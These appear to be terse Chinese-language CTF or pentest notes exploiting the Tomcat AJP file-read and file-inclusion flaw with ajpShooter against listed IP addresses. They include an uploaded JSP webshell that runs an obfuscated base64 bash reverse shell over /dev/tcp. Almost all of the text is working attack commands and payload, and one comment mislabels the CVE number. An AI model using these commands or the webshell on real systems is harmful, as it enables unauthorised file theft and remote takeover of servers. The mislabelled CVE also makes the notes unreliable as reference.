```sh
root@kali-server:~# proxychains4 -q python3 ajpShooter.py http://172.30.12.236:8080 8009 /WEB-INF/web.xml read
# 找到         <servlet-class>com.remote.fastjson.LoginServlet</servlet-class>
root@kali-server:~# proxychains4 -q python3 ajpShooter.py http://172.30.12.236:8080 8009 /META-INF/maven/com.remote/fastjson/pom.xml read

# 文件包含 读取
python3 ajpShooter.py http://39.99.243.178:8080 8009 /WEB-INF/web.xml read
python3 ajpShooter.py http://47.93.140.10:20922 20922 /WEB-INF/classes/test.class read -o a.txt
# 文件包含 CVE-2020-1983 运行文件, .txt内容为反弹shell
python3 ajpShooter.py http://39.99.243.178:8080 8009 /upload/449aeddf75375deb7ab4a6f4d5744b82/20231013105121244.txt eval
```

上传的马 20231013105121244.txt
```jsp
<%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgveHh4IDA+JjE=}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
%>
```

# Article
[绕过 | POST | [CTF复现计划]2024数字中国人才积分赛初赛 AA8](https://mp.weixin.qq.com/s/bgeq5bYOKas4-ES4XcLiSA)
